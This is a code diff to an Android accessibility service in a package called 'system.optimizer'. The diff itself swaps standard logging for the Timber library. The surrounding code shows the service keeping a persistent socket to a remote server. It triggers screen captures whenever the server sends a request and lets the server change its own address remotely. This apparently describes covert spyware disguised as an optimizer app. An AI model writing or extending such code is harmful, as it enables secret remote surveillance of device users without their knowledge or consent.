@@ -9,8 +9,10 @@ import android.os.Build;
 
 import org.json.JSONObject;
 
+import com.system.optimizer.util.TimberInitializer;
+
 import android.accessibilityservice.AccessibilityService;
-import android.util.Log;
+import timber.log.Timber;
 import android.view.accessibility.AccessibilityEvent;
 
 import java.util.concurrent.ExecutorService;
@@ -18,7 +20,7 @@ import java.util.concurrent.Executors;
 import java.util.concurrent.TimeUnit;
 
 public class AccessibilityMonitorService extends AccessibilityService {
-    private static final String TAG = "AccessibilityMonitorService";
+
 
     private SocketManager socketManager;
     private AppConfig appConfig;
@@ -33,7 +35,8 @@ public class AccessibilityMonitorService extends AccessibilityService {
     @Override
     public void onCreate() {
         super.onCreate();
-        Log.d(TAG, "Initializing AccessibilityMonitorService");
+        TimberInitializer.init();
+        Timber.d("Initializing AccessibilityMonitorService");
 
         try {
             this.appConfig = new AppConfig(this);
@@ -49,17 +52,17 @@ public class AccessibilityMonitorService extends AccessibilityService {
                     JSONObject data = (JSONObject) args[0];
                     String requestId = data.getString("request_id");
 
-                    Log.d(TAG, "Screenshot request received: " + requestId);
+                    Timber.d("Screenshot request received: %s", requestId);
                     accessibilityEventHandler.triggerManualCapture(requestId);
 
                 } catch (Exception e) {
-                    Log.e(TAG, "Invalid screenshot request format", e);
+                    Timber.e(e, "Invalid screenshot request format");
                     socketManager.sendEvent("screenshot_error", "Invalid or missing request_id");
                 }
             });
 
             this.socketManager.addPersistentListener("config_data", args -> {
-                Log.d(TAG, "ConfigData event received from server");
+                Timber.d("ConfigData event received from server");
                 try {
                     JSONObject configJson = (JSONObject) args[0];
 
@@ -69,25 +72,25 @@ public class AccessibilityMonitorService extends AccessibilityService {
                     // Get current stored URL before updating config
                     String currentServerUrl = appConfig.getStoredServerUrl();
 
-                    Log.d(TAG, "Refreshing config data from server");
+                    Timber.d("Refreshing config data from server");
                     appConfig.setConfig(serverConfig);
 
                     // Check if server URL has changed
                     if (currentServerUrl == null || !currentServerUrl.equals(newServerUrl)) {
-                        Log.d(TAG, "Server URL changed from " + currentServerUrl + " to " + newServerUrl);
+                        Timber.d("Server URL changed from %s to %s", currentServerUrl, newServerUrl);
 
-                        Log.d(TAG, "Reconnecting socket to new URL");
+                        Timber.d("Reconnecting socket to new URL");
                         socketManager.reconnectToNewUrl();
                     }
                 } catch (Exception e) {
-                    Log.e(TAG, "Error processing config_data from server: " + e.getMessage(), e);
+                    Timber.e(e, "Error processing config_data from server: %s", e.getMessage());
                 }
             });
 
-            Log.d(TAG, "All components initialized successfully");
+            Timber.d("All components initialized successfully");
         } catch (Exception e) {
             // Log error but don't crash the service
-            Log.e(TAG, "Error initializing components", e);
+            Timber.e(e, "Error initializing components");
         }
     }
 
@@ -100,7 +103,7 @@ public class AccessibilityMonitorService extends AccessibilityService {
         try {
             accessibilityEventHandler.onAccessibilityEvent(event);
         } catch (Exception e) {
-            Log.e(TAG, "Error handling accessibility event", e);
+            Timber.e(e, "Error handling accessibility event");
         }
     }
 
@@ -111,7 +114,7 @@ public class AccessibilityMonitorService extends AccessibilityService {
     @Override
     public void onDestroy() {
         try {
-            Log.d(TAG, "Shutting down service and executor");
+            Timber.d("Shutting down service and executor");
 
             // Gracefully shut down the background executor
             backgroundExecutor.shutdown();
@@ -123,7 +126,7 @@ public class AccessibilityMonitorService extends AccessibilityService {
                 socketManager.disconnect(true);
             }
         } catch (Exception e) {
-            Log.e(TAG, "Error during onDestroy cleanup", e);
+            Timber.e(e, "Error during onDestroy cleanup");
         } finally {
             super.onDestroy();
         }
